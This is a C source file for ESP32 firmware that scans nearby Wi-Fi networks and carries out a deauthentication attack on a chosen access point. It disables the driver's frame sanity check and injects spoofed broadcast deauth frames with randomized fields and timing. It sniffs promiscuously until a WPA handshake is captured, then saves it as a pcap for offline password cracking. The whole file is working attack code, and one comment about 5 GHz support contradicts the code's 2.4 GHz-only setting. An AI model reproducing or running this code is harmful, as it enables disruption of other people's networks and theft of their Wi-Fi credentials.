// main/deauth.c
#include "deauth.h"
#include "handshake.h"
#include "wifi_sniffer.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_mac.h"
#include "esp_random.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "ui.h"
#include <string.h>

static const char *TAG = "deauth";

// Override the driver's sanity check so deauth frames can be injected.
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

#define SCAN_DONE_BIT BIT0

static EventGroupHandle_t s_scan_evt   = NULL;
static deauth_network_t   s_nets[DEAUTH_MAX_NETWORKS];
static int                s_net_count  = 0;
static volatile bool      s_scan_done  = false;

static volatile bool      s_deauth_running = false;
static TaskHandle_t       s_deauth_task    = NULL;

static void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    handshake_feed(pkt->payload, pkt->rx_ctrl.sig_len,
                   pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel);
}

static void scan_event_handler(void *arg, esp_event_base_t base,
                               int32_t event_id, void *data)
{
    (void)arg; (void)data;
    if (base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
        xEventGroupSetBits(s_scan_evt, SCAN_DONE_BIT);
    }
}

esp_err_t deauth_init(void)
{
    s_scan_evt = xEventGroupCreate();
    if (!s_scan_evt) return ESP_ERR_NO_MEM;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &scan_event_handler, NULL, NULL));
    handshake_init();
    return ESP_OK;
}

esp_err_t deauth_scan_start(void)
{
    s_net_count = 0;
    s_scan_done = false;
    xEventGroupClearBits(s_scan_evt, SCAN_DONE_BIT);

    esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (mode_err != ESP_OK) return mode_err;

    // 2.4 GHz only. AUTO band makes the C5 passively scan every 5 GHz DFS
    // channel (52-144), each of which takes up to 60 s. The scan never
    // completes within any sane timeout, so SCAN_DONE never fires and the
    // UI stays on "SCANNING...". 2.4 GHz completes in 2-3 seconds.
    esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);

    esp_err_t e = esp_wifi_start();
    if (e != ESP_OK && e != ESP_ERR_WIFI_STATE) return e;

    wifi_scan_config_t cfg = {
        .ssid = NULL, .bssid = NULL, .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 50, .max = 100 } },
    };

    esp_err_t err = esp_wifi_scan_start(&cfg, false);
    if (err != ESP_OK && err != ESP_ERR_WIFI_STATE) {
        return err;
    }
    return ESP_OK;
}

static void harvest_scan(void)
{
    uint16_t num = DEAUTH_MAX_NETWORKS;
    wifi_ap_record_t records[DEAUTH_MAX_NETWORKS];
    if (esp_wifi_scan_get_ap_records(&num, records) != ESP_OK) return;

    s_net_count = 0;
    for (int i = 0; i < num && s_net_count < DEAUTH_MAX_NETWORKS; i++) {
        if (records[i].ssid[0] == 0) continue;
        deauth_network_t *n = &s_nets[s_net_count];
        memcpy(n->ssid, records[i].ssid, 32);
        n->ssid[32] = '\0';
        memcpy(n->bssid, records[i].bssid, 6);
        n->channel = records[i].primary;
        n->rssi    = records[i].rssi;
        n->pmf_required =
            (records[i].authmode == WIFI_AUTH_WPA3_PSK) ||
            (records[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
        s_net_count++;
    }
}

bool deauth_scan_done(void)
{
    if (s_scan_done) return true;
    EventBits_t bits = xEventGroupWaitBits(s_scan_evt, SCAN_DONE_BIT,
                                           pdFALSE, pdFALSE, 0);
    if (bits & SCAN_DONE_BIT) {
        harvest_scan();
        s_scan_done = true;
    }
    return s_scan_done;
}

int deauth_network_count(void) { return s_net_count; }

const deauth_network_t *deauth_network_at(int idx)
{
    if (idx < 0 || idx >= s_net_count) return NULL;
    return &s_nets[idx];
}

static uint16_t random_deauth_reason(void)
{
    static const uint8_t reasons[] = { 1, 2, 3, 4, 5, 6, 7, 15 };
    return reasons[esp_random() % (sizeof(reasons) / sizeof(reasons[0]))];
}

static size_t build_deauth_frame(uint8_t *buf, const uint8_t *bssid)
{
    size_t i = 0;
    buf[i++] = 0xC0;
    buf[i++] = 0x00;

    uint16_t duration = esp_random() & 0x03FF;
    buf[i++] = duration & 0xFF;
    buf[i++] = (duration >> 8) & 0xFF;

    memset(&buf[i], 0xFF, 6); i += 6;
    memcpy(&buf[i], bssid, 6); i += 6;
    memcpy(&buf[i], bssid, 6); i += 6;

    uint16_t seq = esp_random() & 0x0FFF;
    buf[i++] = (seq << 4) & 0xF0;
    buf[i++] = (seq >> 4) & 0xFF;

    uint16_t reason = random_deauth_reason();
    buf[i++] = reason & 0xFF;
    buf[i++] = (reason >> 8) & 0xFF;

    return i;
}

static void deauth_task(void *arg)
{
    int idx = (int)(intptr_t)arg;
    const deauth_network_t *net = deauth_network_at(idx);
    if (!net) goto done;

    uint8_t bssid[6];
    uint8_t channel;
    memcpy(bssid, net->bssid, 6);
    channel = net->channel;

    handshake_reset(bssid);

    // Set target channel — works for both 2.4 GHz and 5 GHz channels
    // as long as band mode is AUTO (set in deauth_scan_start).
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "set_channel(%u) failed: %s",
                 channel, esp_err_to_name(err));
        goto done;
    }

    esp_wifi_set_max_tx_power(8);

    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA};
    if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK) goto done;
    if (esp_wifi_set_promiscuous_rx_cb(promiscuous_cb) != ESP_OK) goto done;
    if (esp_wifi_set_promiscuous(true) != ESP_OK) goto done;

    vTaskDelay(pdMS_TO_TICKS(50));

    uint8_t frame[26];
    size_t  flen = 0;

    while (s_deauth_running) {
        flen = build_deauth_frame(frame, bssid);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)flen, false);

        if (handshake_is_usable(bssid)) {
            esp_err_t r = handshake_dump_pcap(bssid, net->ssid);
            if (r == ESP_OK) {
                ui_set_status("CAPTURED");
            } else {
                ui_set_status("SD FAIL");
            }
            break;
        }

        uint32_t jitter_ms = 20 + (esp_random() % 61);
        vTaskDelay(pdMS_TO_TICKS(jitter_ms));
    }

    esp_wifi_set_promiscuous(false);

done:
    esp_wifi_set_max_tx_power(78);
    wifi_sniffer_rearm();

    s_deauth_running = false;
    s_deauth_task    = NULL;
    vTaskDelete(NULL);
}

esp_err_t deauth_start(int idx)
{
    if (s_deauth_running) return ESP_OK;
    if (idx < 0 || idx >= s_net_count) return ESP_ERR_INVALID_ARG;
    if (s_nets[idx].pmf_required) return ESP_ERR_NOT_SUPPORTED;

    s_deauth_running = true;
    BaseType_t ret = xTaskCreate(deauth_task, "deauth_tx", 4096,
                                 (void*)(intptr_t)idx, 5, &s_deauth_task);
    if (ret != pdPASS) {
        s_deauth_running = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t deauth_stop(void)
{
    if (!s_deauth_running) return ESP_OK;
    s_deauth_running = false;
    for (int i = 0; i < 20 && s_deauth_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    return ESP_OK;
}

bool deauth_is_running(void) { return s_deauth_running; }